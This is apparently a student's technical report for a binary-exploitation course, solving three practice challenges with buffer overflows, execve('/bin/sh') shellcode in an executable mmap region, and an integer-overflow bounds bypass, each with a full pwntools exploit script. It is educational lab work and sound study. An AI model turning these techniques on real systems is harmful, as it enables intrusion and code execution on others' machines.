---
title: "Project 2"
subtitle: "Technical Report"
author: [Atharva Kale]
date: "2023-03-04"
caption-justification: centering
titlepage: false
header-includes:
 - \usepackage{fvextra}
 - \DefineVerbatimEnvironment{Highlighting}{Verbatim}{breaklines,commandchars=\\\{\}}
---

# Technical Report

## Contents:
- [chall1](#chall1)
    - Location of the checks
    - The exploit script that prints the flag
    - chall1 exploit script result
- [chall2](#chall2)
    - Explain bug in code (20 pts.)
    - What if mmap was at a random address (20 pts.)
- [chall3](#chall3)
    - Integer overflow
    - Writing an exploit
    - Packing assembly into integers
    - chall3 exploit script result

\newpage
## `chall1`

### An overview

The `chall1` binary seems very simple at first.

![`chall1` disassembly](./screenshots/chall_1_disas.png){width=400}

We have an unprotected `gets` call! This makes it quite easy to overflow the return address of main, and jump to arbitrary parts of this program's code section.

We also find a function called `get_flag`, which seems to open `flag.txt` and print the contents to `stdout`. In order to get to this point, we need to pass three checks (or jump directly to the `fopen` call for the flag :))

![`get_flag` symbol](./screenshots/get_flag.png){width=400}

\newpage
### Location of the checks

\begin{table}[!ht]
    \centering
    \begin{tabular}{|l|l|l|l|}
    \hline
        Symbol & check\_1 & check\_2 & check\_3 \\ \hline
        book & Set & - & - \\ \hline
        color & Read & Set & - \\ \hline
        movie & Read & Read & Set \\ \hline
        get\_flag & Read & Read & Read \\ \hline
    \end{tabular}
    \caption{Locations of the checks}
\end{table}

### `book` disassembly

![`book` symbol](./screenshots/book.png){width=400}

We find that `check_1` is set in the `book` function. 

To jump to the book function, we need to overflow all 16 bytes of the buffer in main, overflow the previous rbp address on the stack with 8 bytes, and then put the return address to `book`.

To set the check, we find that the buffer is laid above the local variable, so if we can overflow the buffer, we can overflow the local variable.

We overflow the 28 byte buffer, followed by writing `0xcafebabe` into the local variable. This sets `check_1`.


### `color` disassembly

![`color` symbol](./screenshots/color.png){width=400}

We find that `check_2` is set in the `color` function.

To jump to the `color` function, we need to overflow the previous rbp address on the stack with 8 bytes, and then put the return address to `color`.

To set the `check_2`, we find that the buffer is laid above the local variable, so if we can overflow the buffer, we can overflow the local variable.

We overflow the 28 byte buffer, followed by writing `0xdeadbeef` into the local variable. Since `check_1` is already set from before, this sets `check_2`.

### `movie` disassembly

![`movie` symbol](./screenshots/movie.png){width=400}

We find that `check_3` is set in the `movie` function.

To jump to the `movie` function, we need to overflow the previous rbp address on the stack with 8 bytes, and then put the return address to `movie`.

To set the `check_3`, we find that the buffer is laid above the local variable, so if we can overflow the buffer, we can overflow the local variable.

We overflow the 28 byte buffer, followed by writing `0x13371337` into the local variable. Since `check_1` and `check_2` is already set from before, this sets `check_3`.

Finally, we can jump to the `get_flag` function, by overflowing the previous rbp address on the stack with 8 bytes, and then put the return address to `get_flag`.

Since all the three checks are set, `get_flag` prints the flag out.

### The exploit script

```python
from pwn import *

p = process("./chall1", stdin=process.PTY, stdout=process.PTY)

payload = b""

payload += b"i" * 0x10  # overwrite entire buffer in main
payload += b"i" * 8  # overwrite previous rbp
payload += p64(0x401284)  # put the address of `book`

p.sendline(payload)


payload = b""
payload += b"i" * 28  # write all the bytes of the local buffer
payload += p32(0xCAFEBABE)  # overflow the buffer to write 4 bytes into the int
payload += b"i" * 8  # overwrite previous rbp
payload += p64(0x00401221)  # overwrite return address with the address of `color`

p.sendline(payload)

payload = b""
payload += b"i" * 28  # write all the bytes of the local buffer
payload += p32(0xDEADBEEF)  # overflow the buffer to write 4 bytes into the int
payload += b"i" * 8  # overwrite previous rbp
payload += p64(0x004012DC)  # overwrite return address with the address of `movie`

p.sendline(payload)

payload = b""
payload += b"i" * 28  # write all the bytes of the local buffer
payload += p32(0x13371337)  # overflow the buffer to write 4 bytes into the int
payload += b"i" * 8  # overwrite previous rbp
payload += p64(0x0040134A)  # overwrite return address with the address of `get_flag`

p.sendline(payload)

print(p.recvall().decode(encoding="latin"))
```

### Result: The Flag

![The Flag](./screenshots/chall1_flag.png)


\newpage
## `chall2`

### Explain the bug in the code (20 pts.)

![Bugs in `chall2`](./screenshots/chall2_bugs.png)

There are three main bugs that let us exploit this binary:

(1) An executable `mmap` buffer
(2) A leaked memory address
(3) A buffer overflow

A combination of these three bugs let us exploit this binary quite easily. The 32 byte buffer overflow is enough so that we are able to overwrite all 16 bytes of local variables, 8 bytes of previous rbp on the stack and most crucially the return address. We can use the buffer normally until we wish to change the return address.

Next, we are able to write 4 notes such that we get 768 bytes of arbitrary code that can be written to the `mmap` partition. This partition is crucially also set with an executable permission, so that the OS will execute our arbitrary code.

Third, the hardcoded memory address for the `mmap` partition makes it so that we can always know where our arbitrary code in memory lives in every memory every execution of the binary. This makes it easy to know where to point the return address on the stack when we overflow it.

### What if `mmap` was at a random address (20 pts.)

A collection of incidental bugs together could sometimes lead to an exploit. If `mmap` was at a random address, we would lose the address leak that we now use to write shellcode into. Running `checksec` on the executable gives us the following report:

![`checksec` report for `chall2`](./screenshots/chall2-checksec.png)

We can see that basically every security feature is disabled. We would need to find at least one more leak to be able to fully exploit this binary. 

(1) For example, the current buffer overflow allows us to write 32 bytes onto the stack memory. This is just enough to be able to write over the return address of the current stack frame, but is not enough for any kind of ROP attack. A larger buffer overflow could allow us to use gadgets found in the program.

(2) A `printf` leak could allow us to regain the address of the `mmap`ed buffer. This could allow us to use the same exploit as below.

(3) Another option is if we had the address of an RWX section, we could potentially overwrite the address pointing to the `mmap` section, and use that segment instead to write shellcode into.

(4) Since only Partial-RELRO is enabled, we could write the address of the GOT into `local_10`, and then be able to write the offset of a different `libc` function. With this, we have the possibility of setting up parameters to calls such as `system` if we had space for ROP.x


### The exploit script

```python
from pwn import *

context.terminal = [
    "gnome-terminal",
    "--window-with-profile=",
    "main",
    "-x",
    "sh",
    "-c",
]
context.arch = "amd64"

p = process("./chall2", stdin=process.PTY, stdout=process.PTY)

# Write to a note
payload = b"1"
p.sendline(payload)

# Write to note number 1
payload = b"1"
p.sendline(payload)

sh = b"/bin//sh"
sh = hex(int.from_bytes(sh, "little"))

# Write the ASM (max 255 bytes)
payload = asm(
    f"""
    xor rax, rax
    mov rax, 59
    xor rbx, rbx
    push rbx
    mov rbx, {sh}
    push rbx
    mov rdi, rsp
    mov rsi, 0
    mov rdx, 0
    syscall
"""
)

p.sendline(payload)

# Overwrite all 16 bytes stack on main + 16 bytes

payload = b""
payload += b"E" * 24
payload += p64(0x1337000)

p.sendline(payload)
print()
p.interactive()
```


### Result: A successful spawned shell

![A Shell](./screenshots/shell-chall2.png)

\newpage
## `chall3`

### An overview

The `chall3` executable is a simple program that accepts an arbitrary of number of integers $c$ to add, and prints the sum of these numbers to the screen.

![An Array Sum Program\label{array-sum-prog}](./screenshots/chall3-run.png){width=400}

Upon first examining the disassembly of the program, we find that the program runs completely when $c \leq 16$. The program "disallows" more than 16 numbers, as it has a limited buffer to use to store the input numbers.

![Bounds check for input](./screenshots/bounds-check-chall3.png)

This bounds check is ripe for integer overflow, as if the integer `num_of_ints_to_add` gets to `INT_MAX/4 + 1`, the bounds check would pass from an overflow, even though the input buffer can hold a maximum of 19 integers.


### Integer overflow

From the image above, we discover how we can overflow the integer. We choose a value of `536870912` in the exploit script, as `536870912*4` = `2147483648` which is one more than an integer can hold, hence making the expression `0 < 65` evaluate to true.

Since the binary does not have stack protections enabled, we can write arbitrary code onto to stack, and then overflow the return address to jump to the code.

What address do we jump to? This is helpfully leaked by the program to `stdout` as seen in Figure \ref{array-sum-prog}.

### Writing an exploit

![Writing the code onto the stack](./screenshots/writing-code-chall3.png)

First, we need to write assembly that is able to (1) open a flag file, (2) read the contents in it into a buffer (3) write those contents out to `stdout`. Moreover, we need this code to be under 88 bytes (we have 19*4 bytes in the integer buffer, 4 bytes from an integer local variable and 8 bytes for the saved rbp register).

We attempt to write optimized code for this. A key factor is changing the stack pointer sufficiently away from our 
code so that the read of the flag does not overwrite the code on the stack.

We are able to achieve a size of **75 bytes** on our code.

Next, we focus our analysis on how to write our code onto the stack. We need to write the code as integers in groups of 4 bytes. We utilize a great helper function from the `pwntools` library to achieve this effect and write these bytes to `stdin` with appropriate encoding.

![Packing 4 byte integers](./screenshots/packing-bytes-chall3.png)

This gives us our exploit script.


### The exploit script

```python
from pwn import *
from pwnlib.util import iters

context.terminal = [
    "gnome-terminal",
    "--window-with-profile=",
    "main",
    "-x",
    "sh",
    "-c",
]
context.arch = "amd64"

p = process("./chall3", stdin=process.PTY, stdout=process.PTY)

# Please enter the number of integers to add:
payload = b"536870912"
p.sendline(payload)

# Get the address of the buffer (memory leak)
p.recvuntil(b"This may be useful in your calculations: ")
return_addr_buf = p.recvline(keepends=False)
return_addr_buf = int(return_addr_buf, 16)
print(f"{hex(return_addr_buf)=}")


# Setup ASM
payload = asm(
    f"""
    mov    rbp,rsp
    sub    rsp,0x500                
    push   0x0
    mov    rax,0x7478742e67616c66
    push   rax
    xor    esi,esi                  # mode
    xor    edx,edx                  # flags
    mov    rdi,rsp                  # filename
    xor    eax,eax
    inc    eax                      # open syscall
    inc    eax                      # open syscall
    syscall
    mov    edi,eax                  # fd (return of open)
    xor    rsi,rsi
    lea    rsi,[rbp-0x500]          # buf
    mov    edx,0x8                  # count
    xor    eax,eax                  # read syscall
    syscall
    xor    edi,edi
    inc    edi                      # fd (stdout)
    mov    edx,0x8                  # count
    xor    rax,rax
    inc    eax
    syscall
"""
)
asm_len = len(payload)
print(f"Length of assembly: {asm_len} bytes")

to_fully_fill_buffer = b"i" * (80 - len(payload)) # to fully fill the `array_ints` buffer + local_c

payload += to_fully_fill_buffer

payload += b"i" * 8  # overwrite pushed rbp
payload += p64(return_addr_buf)

for i, integer in enumerate(iters.group(4, payload, b"0")):
    grp_4 = u32(bytes(integer))
    p.sendline(str(grp_4).encode(encoding="latin"))

p.sendline(str(0).encode(encoding="latin"))

print(p.recvall().decode(encoding="latin"))
```

### Result: The Flag

![The Flag](./screenshots/flag-chall3.png)